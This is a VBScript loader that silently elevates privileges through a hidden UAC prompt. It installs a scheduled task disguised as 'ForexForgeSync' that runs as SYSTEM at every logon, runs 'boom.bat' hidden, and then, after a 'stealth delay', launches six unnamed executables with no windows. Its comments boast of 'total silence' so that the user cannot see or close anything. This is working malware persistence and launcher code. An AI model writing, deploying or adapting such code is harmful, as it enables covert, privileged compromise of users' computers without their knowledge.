Set UAC = CreateObject("Shell.Application")
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' Get paths and set current directory
strPath = FSO.GetParentFolderName(WScript.ScriptFullName)
strScript = WScript.ScriptFullName
WshShell.CurrentDirectory = strPath

' --- STEP 1: ELEVATION & INITIAL SETUP ---
' This runs once to install the task. It uses /task as a marker for reboots.
If Not WScript.Arguments.Named.Exists("task") And Not WScript.Arguments.Named.Exists("elevate") Then
    ' Trigger UAC prompt hidden (0)
    UAC.ShellExecute "wscript.exe", Chr(34) & strScript & Chr(34) & " /elevate", "", "runas", 0
    WScript.Quit
End If

' --- STEP 2: INSTALL THE WINDOWLESS TASK ---
strTaskName = "ForexForgeSync"

' This is the "Magic Line" for total silence:
' 1. We call wscript.exe directly (NOT cmd.exe) so no black window can form.
' 2. //B tells the engine to suppress all errors and popups.
' 3. /RU "SYSTEM" runs it in a hidden system layer (Session 0).
strCreateTask = "schtasks /create /tn """ & strTaskName & """ /tr ""wscript.exe //B \""" & strScript & "\"" /task"" /sc onlogon /rl highest /ru ""SYSTEM"" /f"

' Execute the task creation hidden (0)
WshShell.Run "cmd.exe /c " & strCreateTask, 0, True

' --- STEP 3: RUN BOOM.BAT (Only on first install) ---
If WScript.Arguments.Named.Exists("elevate") Then
    ' Run boom.bat hidden (0) so the first setup is also silent
    WshShell.Run "cmd.exe /c boom.bat", 0, True
End If

' --- STEP 4: STEALTH DELAY ---
' This 30s wait happens in the background with NO window for the user to close.
WScript.Sleep 30000 

' --- STEP 5: LAUNCH THE 6 APPS ---
' Using the '0' flag ensures these apps also start without windows.
' False means the script doesn't wait for one app to close before starting the next.
WshShell.Run """" & strPath & "\sigurd.exe""", 0, False
WshShell.Run """" & strPath & "\client.exe""", 0, False
WshShell.Run """" & strPath & "\file3.exe""", 0, False
WshShell.Run """" & strPath & "\file4.exe""", 0, False
WshShell.Run """" & strPath & "\file5.exe""", 0, False
WshShell.Run """" & strPath & "\file6.exe""", 0, False
